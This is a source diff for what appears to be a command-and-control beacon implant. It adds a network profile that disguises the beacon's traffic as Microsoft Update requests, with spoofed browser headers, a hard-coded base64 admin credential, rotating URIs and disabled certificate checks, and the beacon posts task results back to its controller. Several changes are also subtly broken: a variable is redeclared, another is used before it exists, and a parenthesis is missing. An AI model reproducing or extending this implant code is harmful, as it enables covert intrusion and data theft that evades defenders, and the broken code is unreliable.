@@ -17,33 +17,63 @@
 using namespace std;
 
 
-const std::string HttpsEndPoint = "/HttpsEndPoint";
-const std::string HttpsContentType = "text/plain";
-
-const std::string HttpEndPoint = "/HttpEndPoint";
-const std::string HttpContentType = "text/plain";
-
-
-json httpGet = {
-	{"http-get", {
-		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
-		{"client", {
-			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
-		}},
-		{"server", {
-			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
-		}}
-  	}},
+json BeaconHttpConfig = {
 	{"http-post", {
 		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
 		{"client", {
-			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+			{"headers", {
+                {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
+                {"Content-Type","text/plain;charset=UTF-8"},
+                {"Content-Language","fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
+				{"Authorization", "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="},
+                {"Keep-Alive", "timeout=5, max=1000"},
+                {"Connection","Keep-Alive"},
+                {"Cookie","PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"},
+                {"Accept","*/*"},
+                {"Sec-Ch-Ua","\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""},
+                {"Sec-Ch-Ua-Platform","Windows"}
+            }}
 		}},
 		{"server", {
-			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
+			{"headers", {
+                {"Access-Control-Allow-Origin", "true"},
+                {"Connection","Keep-Alive"},
+                {"Content-Type","application/json"},
+                {"Server","Server"},
+                {"Strict-Transport-Security","max-age=47474747; includeSubDomains; preload"},
+                {"Vary","Origin,Content-Type,Accept-Encoding,User-Agent"}
+            }}
+		}}
+  	}},
+	{"https-post", {
+		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
+		{"client", {
+			{"headers", {
+                {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
+                {"Content-Type","text/plain;charset=UTF-8"},
+                {"Content-Language","fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
+				{"Authorization", "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="},
+                {"Keep-Alive", "timeout=5, max=1000"},
+                {"Connection","Keep-Alive"},
+                {"Cookie","PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"},
+                {"Accept","*/*"},
+                {"Sec-Ch-Ua","\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""},
+                {"Sec-Ch-Ua-Platform","Windows"}
+            }}
+		}},
+		{"server", {
+			{"headers", {
+                {"Access-Control-Allow-Origin", "true"},
+                {"Connection","Keep-Alive"},
+                {"Content-Type","application/json"},
+                {"Server","Server"},
+                {"Strict-Transport-Security","max-age=47474747; includeSubDomains; preload"},
+                {"Vary","Origin,Content-Type,Accept-Encoding,User-Agent"}
+            }}
 		}}
   	}}
 };
+
 
 
 #ifdef __linux__
@@ -106,10 +136,25 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
 
     // Add a request header.
     if( hRequest )
-        bResults = WinHttpAddRequestHeaders( hRequest, 
-                                            L"If-Modified-Since: Mon, 20 Nov 2000 20:00:00 GMT",
-                                            (ULONG)-1L,
-                                            WINHTTP_ADDREQ_FLAG_ADD );
+    {
+        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
+        if(isHttps)
+            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];
+
+        for (auto& it : httpHeaders.items())
+        {
+            std::string newHeader = (it).key();
+            newHeader+=":";
+            newHeader+=(it).value();
+
+            std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());
+
+            bResults = WinHttpAddRequestHeaders( hRequest, 
+                                                stemp.c_str(),
+                                                (ULONG)-1L,
+                                                WINHTTP_ADDREQ_FLAG_ADD );
+        }
+    }
 
     if(isHttps)
     {
@@ -120,12 +165,16 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
             SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
 
-        WinHttpSetOption(
-            hRequest,
-            WINHTTP_OPTION_SECURITY_FLAGS,
-            &dwFlags,
-            sizeof(dwFlags));
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
     }
+
+    // // Debug proxy configuration
+    // // https://stackoverflow.com/questions/35082021/code-to-send-an-http-request-through-a-proxy-using-winhttp
+    // // https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
+    // WINHTTP_PROXY_INFO proxy = { 0 };
+    // proxy.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+    // proxy.lpszProxy = L"http://127.0.0.1:8080";
+    // WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxy, sizeof(proxy));
 
     // Post data
     LPSTR pdata = const_cast<char*>(data.c_str());;
@@ -134,8 +183,8 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
     // Send a request.
     if (hRequest)
         bResults = WinHttpSendRequest(hRequest,
-            additionalHeaders, 
-            headersLength,
+            WINHTTP_NO_ADDITIONAL_HEADERS, 
+            0,
             (LPVOID)pdata,
             lenData,
             lenData,
@@ -242,12 +291,20 @@ void BeaconHttp::checkIn()
         std::string output;
         taskResultsToCmd(output);
 
-        httplib::Headers httpsClientHeaders = {
-            { "Accept-Encoding", "gzip, deflate" },
-            { "User-Agent", "https client agent" }
-        };
+        auto httpsUri = BeaconHttpConfig["https-post"]["uri"];
+        srand(time(NULL));
+        std::string httpsUri = httpsUri[ rand() % httpUri.size() ];
 
-        if (auto res = cli.Post(HttpsEndPoint, httpsClientHeaders, output, HttpsContentType))
+        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
+        if(m_isHttps)
+            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];
+
+        httplib::Headers httpClientHeaders;
+        for (auto& it : httpHeaders.items())
+            httpClientHeaders.insert({(it).key(), (it).value()});
+        res.headers = httpClientHeaders;
+
+        if (auto res = cli.Post(httpsUri, httpClientHeaders, output)
         {
             if (res->status == 200) 
             {
@@ -266,13 +323,20 @@ void BeaconHttp::checkIn()
         std::string output;
         taskResultsToCmd(output);
 
-        httplib::Headers httpClientHeaders = {
-            { "Accept-Encoding", "gzip, deflate" },
-            { "Authorization", "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd" },
-            { "User-Agent", "http client agent" }
-        };
+        auto httpUri = BeaconHttpConfig["http-post"]["uri"];
+        srand(time(NULL));
+        std::string endPoint = httpUri[ rand() % httpUri.size() ];
 
-        if (auto res = cli.Post(HttpEndPoint, httpClientHeaders, output, HttpContentType))
+        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
+        if(m_isHttps)
+            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];
+
+        httplib::Headers httpClientHeaders;
+        for (auto& it : httpHeaders.items())
+            httpClientHeaders.insert({(it).key(), (it).value()});
+        res.headers = httpClientHeaders;
+
+        if (auto res = cli.Post(endPoint, httpClientHeaders, output))
         {
             if (res->status == 200) 
             {
@@ -287,12 +351,21 @@ void BeaconHttp::checkIn()
 
 #elif _WIN32
 
-    std::string endPoint = HttpEndPoint;
-    std::string contentType = HttpContentType;
+    std::string endPoint;
+
     if(m_isHttps)
     {
-        endPoint = HttpsEndPoint;
-        contentType = HttpsContentType;
+        auto httpsUri = BeaconHttpConfig["https-post"]["uri"];
+        
+        srand(time(NULL));
+        endPoint = httpsUri[ rand() % httpsUri.size() ];
+    }
+    else
+    {
+        auto httpUri = BeaconHttpConfig["http-post"]["uri"];
+
+        srand(time(NULL));
+        endPoint = httpUri[ rand() % httpUri.size() ];
     }
 
 	std::string output;
